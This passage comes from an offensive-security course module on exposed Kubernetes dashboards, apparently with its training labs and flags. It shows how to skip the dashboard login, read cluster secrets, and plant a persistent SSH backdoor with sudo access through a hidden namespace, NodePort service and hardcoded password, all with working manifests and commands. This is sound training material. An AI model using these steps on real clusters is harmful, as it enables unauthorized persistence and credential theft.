(Nmap, 2022), [https://nmap.org/](https://nmap.org/) [↩︎](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/discovering-exposed-kubernetes-dashboards-39863/exploiting-an-exposed-dashboard-39890/running-a-backdoor-39864#fnref-local_id_1242-1)

2

(K3s, 2022), [https://k3s.io/](https://k3s.io/) [↩︎](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/discovering-exposed-kubernetes-dashboards-39863/exploiting-an-exposed-dashboard-39890/running-a-backdoor-39864#fnref-local_id_1242-2)

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

dashboard-exposed

dashboard-exposed-secure

#### Labs

1. What port is used on the _dashboard-exposed_ target to expose the dashboard? Note: This port is different then what is shown in the course material.

Answer

2. How many pods are in the "running" status on the "dashboard-exposed" target in the Default namespace?

Answer

3. What port is used on the "dashboard-exposed-secure" target to expose the dashboard?

Answer

## 9.3. Exploiting an Exposed Dashboard

Now that we understand what causes the issue and how to discover exposed dashboards using blackbox methodologies, let's investigate what we can do with this level of access.

This Learning Unit covers the following Learning Objectives:

- Use the dashboard to discover secrets
- Use the dashboard to host a backdoor

## 9.3.1. Discovering Secrets

When we gain access to a Kubernetes dashboard we should first determine if we have access to _secrets_. This might include database passwords, API keys, private keys, and much more. The dashboard web interface is a great tool for reviewing this type of data.

Let's attempt to obtain some secrets using the dashboard. We'll start by navigating to the home page.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/d9a225c4dc96ed2586e8c19cac3b298e_MD5.jpg]]

Figure 7: Kubernetes Dashboard - Login Page

We'll skip the login since we have that option.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/3af50d7dbbcbb9ee82d5aa1a423cdd83_MD5.jpg]]

Figure 8: Kubernetes Dashboard - Home Page

We can use the _Secrets_ link on the left-side navigation bar to view the secrets.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/4dd13ffe50a20f2cc014b70278b737aa_MD5.jpg]]

Figure 9: Kubernetes Dashboard - Secrets

Note that when we use kubectl we need to _base64_-decode the secrets. However, in the dashboard, we can extract the value of the secret by clicking on the name and clicking on the eye icon:

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/01c5c02c9790b5da57a0b2b7842f367b_MD5.jpg]]

Figure 10: Kubernetes Dashboard - Secrets

The purpose of secrets in Kubernetes is to keep confidential data out of the application code. For example, if an application needs to access a database, instead of storing the password in the application's source, we can program the application to extract the secret from Kubernetes. In a way, this only moves the problem since the secret still needs to be defined in Kubernetes. However, it's much simpler to have a centralized location with all secrets rather than sensitive data scattered throughout the application.

As an attacker, however, access to reading secrets could be very fruitful. Especially if all the secrets are centralized.

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

dashboard-exposed

#### Labs

1. One of the other namespaces contains a secret. Discover it to find the flag.

Answer

2. Discover the flag in a ConfigMap.

Answer

## 9.3.2. Running a Backdoor

A consistent backdoor is advantageous to an attacker as it provides a way back in if the initial point of access is closed. In this section, we'll discuss how to create a deployment that contains a web shell in the cluster. This web shell will allow us to connect via an HTTP port from the Node's IP.

If we visit the dashboard and log in, we'll find a plus sign in the top right. We can click that to write a manifest and apply it.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/3f3397ed260cc87d953ca83dc8af9d8f_MD5.jpg]]

Figure 11: Kubernetes Dashboard - Create

The message indicates that the resources will be created in the currently-selected namespace.

We're currently in the _Default_ namespace, which is the initial namespace that is displayed in both the Kubernetes dashboard and in kubectl. In order to hide the backdoor, we'll need to create a new namespace.

Since we cannot create a new namespace under the default namespace, we'll need to move to "All namespaces". We'll click on the drop down and select _All namespaces_.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/509305441a4133fca4ac8526030d022d_MD5.jpg]]

Figure 12: Kubernetes Dashboard - Change Namespace

Now that we are not bound to the default namespace, the manifest we write can create and use a new namespace. Before we create a new namespace, let's first decide which application we'll use.

A good option is a container that runs _openssh-server_. This provides a shell to the underlying container. We'll need to pick one that can be configured to use a username and password, so we can ensure no one else has access to it.

We'll use an openssh-server docker container created by the _LinuxServer.io_ group.[1](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/discovering-exposed-kubernetes-dashboards-39863/exploiting-an-exposed-dashboard-39890/running-a-backdoor-39864#fn-local_id_1269-1) This container opens port 2222 by default and is configured using various environmental variables:

- **SUDO_ACCESS**: allow us to place the user in the sudo group
- **PASSWORD_ACCESS**: allows SSH with a password
- **USER_NAME**: the username for the login
- **USER_PASSWORD**: the password for the user

Let's start by creating a namespace.

```
apiVersion: v1
kind: Namespace
metadata:
  name: backdoor
```

> Listing 21 - Namespace for backdoor

We'll specify the standard Kubernetes configuration with the API version, kind, and metadata. We'll name the namespace _backdoor_:

```
---

apiVersion: apps/v1
kind: Deployment
metadata:
  labels:
    app: backdoor
  name: backdoor
  namespace: backdoor
spec:
  selector:
    matchLabels:
      app: backdoor
  template:
    metadata:
      labels:
        app: backdoor
    spec:
      containers:
      - name: backdoor
        image: linuxserver/openssh-server:version-8.6_p1-r3
        env:
          - name: SUDO_ACCESS
            value: "true"
          - name: PASSWORD_ACCESS
            value: "true"
          - name: USER_NAME
            value: cld100
          - name: USER_PASSWORD
            value: hackityhackhack
```

> Listing 22 - Deployment for Backdoor

We'll need to start with the three dashes, which indicate the start of a new YAML document. After that, we'll provide the the standard Kubernetes configuration. We'll call this app "backdoor"; however, in the real world we would probably choose something more inconspicuous. Under _spec_, we'll create the required _selector_ and _template_ fields. Within the template, we need to specify the container.

The container's name will also be "backdoor" and the image will be the **linuxserver/openssh-server** container discussed earlier. We'll configure the various settings under the _env_ portion of the YAML. The username will be "cld100" and the password will be "hackityhackhack".

We'll need some way of accessing the port from the node's IP. For this, we'll create a _Service_ with a type of _NodePort_ in order to access the container publicly.

```
---

apiVersion: v1
kind: Service
metadata:
  labels:
    app: backdoor
  name: backdoor
  namespace: backdoor
spec:
  selector:
    app: backdoor
  type: NodePort
  ports:
    - protocol: TCP
      port: 2222
```

> Listing 22 - Service for Backdoor

We'll once again use the three dashes to indicate a new document and then provide the standard YAML declaration of the API version, kind, and metadata.

Under the _spec_, we'll select the backdoor app, create the service as a NodePort, and specify 2222 as the container port.

Next, we'll put all of this together and add it to the text box in the dashboard.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/20667dd91a7d4ab86077133cfcaaf07e_MD5.jpg]]

Figure 13: Kubernetes Dashboard - Create

Once deployed, we will need to obtain the port that was randomly selected for the service. We can find this by navigating to the _Service_ tab on the left.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/7b9617f4ada1a47f47861cfce503a94f_MD5.jpg]]

Figure 14: Kubernetes Dashboard - Service

The port will be randomly selected, but in this case it is 30511. Next, we'll use **ssh** to login to the container. Since we are running the SSH server on a non-standard port (30511), we'll need to provide the port with the **-p** flag.

```
kali@kali:~$ ssh -p 30511 cld100@dashboard-exposed
The authenticity of host '[dashboard-exposed]:30511 ([dashboard-exposed]:30511)' can't be established.
ECDSA key fingerprint is SHA256:CK3ZJMhgAbmrqO+qSWGmRgZxMGJuQigJT4r1tFX2A2M.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[dashboard-exposed]:30511' (ECDSA) to the list of known hosts.
cld100@dashboard-exposed's password: 
Welcome to OpenSSH Server

backdoor-69958f465d-h69w8:~$
```

> Listing 23 - Connecting to the container via SSH

Excellent! Now even if the Kubernetes Dashboard is locked down or shut off, we have an entry point back into the internal network. It's important to note that this container won't have access to the Kubernetes API like the dashboard did. While this can be added, we'll leave configuring this as an exercise.

1

(LinuxServer.io, 2022), [https://hub.docker.com/r/linuxserver/openssh-server](https://hub.docker.com/r/linuxserver/openssh-server) [↩︎](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/discovering-exposed-kubernetes-dashboards-39863/exploiting-an-exposed-dashboard-39890/running-a-backdoor-39864#fnref-local_id_1269-1)

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

|   |   |   |
|---|---|---|
|Dashboard Exposed - Standard|||
|Dashboard Exposed - Cluster Admin|||

#### Labs

1. Use the _Dashboard Exposed - Standard_ VM for this exercise. Configure the backdoor as demonstrated in this Learning Unit. On the target's port 8080 there is a web application that will provide a flag when the backdoor is configured.

Answer

2. Use the _Dashboard Exposed - Cluster Admin_ VM for this exercise. Configure the backdoor where the deployment has a service account with the cluster-admin role binding. On the target's port 8080 there is a web application that will provide a flag when the backdoor is configured with the appropriate service account.

Answer